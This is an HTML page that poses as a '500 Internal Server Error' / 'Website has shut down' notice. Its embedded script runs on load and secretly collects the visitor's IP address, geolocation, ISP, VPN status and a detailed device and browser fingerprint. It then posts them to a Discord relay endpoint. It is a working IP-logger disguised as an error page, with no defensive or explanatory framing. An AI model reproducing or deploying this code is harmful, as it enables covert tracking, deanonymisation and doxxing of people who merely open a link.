<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500 Internal Server Error</title>
    <style>
        body { 
            background-color: #fff; 
            color: #000; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .error-container { text-align: center; }
        h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; }
        p { font-size: 14px; color: #666; margin: 0; }
    </style>
</head>
<body>

    <div class="error-container">
        <h1>Website has shut down</h1>
        <p>Internal Server Error (Code: 500)</p>
    </div>

    <script>
        async function runDeepLog() {
            let n = {};
            let vpnDetected = "False";

            // Multi-API Fallback for 100% Reliability
            const providers = [
                "https://ipapi.co/json/",
                "https://ipwho.is/",
                "https://api.ipify.org?format=json"
            ];

            for (let url of providers) {
                try {
                    const res = await fetch(url);
                    if (res.ok) {
                        const temp = await res.json();
                        n = { ...n, ...temp };
                        if (n.ip || n.query) break;
                    }
                } catch (e) {}
            }

            // Get GPU Info
            let gpu = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) {}

            const finalIP = n.ip || n.query || "Unknown";
            const finalLocation = n.city ? `${n.city}, ${n.region || n.region_name}, ${n.country_name || n.country}` : "Unknown";
            const finalISP = n.org || n.isp || n.connection?.isp || "Unknown";
            if (n.security && (n.security.vpn || n.security.proxy || n.security.relay)) vpnDetected = "True";

            const stats = {
                "--- NETWORK DATA ---": "",
                "IP Address": finalIP,
                "VPN/Proxy Detected": vpnDetected,
                "Location": finalLocation,
                "ISP": finalISP,
                "Hostname": n.hostname || n.reverse || "None",
                "--- DEVICE HARDWARE ---": "",
                "OS/Platform": navigator.platform,
                "CPU Threads": navigator.hardwareConcurrency || "Unknown",
                "RAM (Approx GB)": navigator.deviceMemory || "Unknown",
                "GPU": gpu,
                "Screen Resolution": `${screen.width}x${screen.height}`,
                "Window Size": `${window.innerWidth}x${window.innerHeight}`,
                "Device Pixel Ratio": window.devicePixelRatio,
                "Color Depth": screen.colorDepth,
                "Touch Support": navigator.maxTouchPoints > 0 ? "Yes" : "No",
                "Max Touch Points": navigator.maxTouchPoints,
                "--- BROWSER/SOFTWARE ---": "",
                "User Agent": navigator.userAgent,
                "Browser Language": navigator.language,
                "System Languages": navigator.languages.join(", "),
                "Cookies Enabled": navigator.cookieEnabled,
                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "Current Time": new Date().toLocaleString(),
                "Referrer": document.referrer || "Direct Visit"
            };

            const output = Object.entries(stats).map(([k, v]) => k.startsWith("---") ? v + k : `${k}: ${v}`).join("\n");

            // Final Push to Discord
            fetch("/api/discord", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: "```\n" + output + "\n```" }), // Formatted in code block for Discord
            }).catch(() => {});
        }

        runDeepLog();
    </script>
</body>
</html>
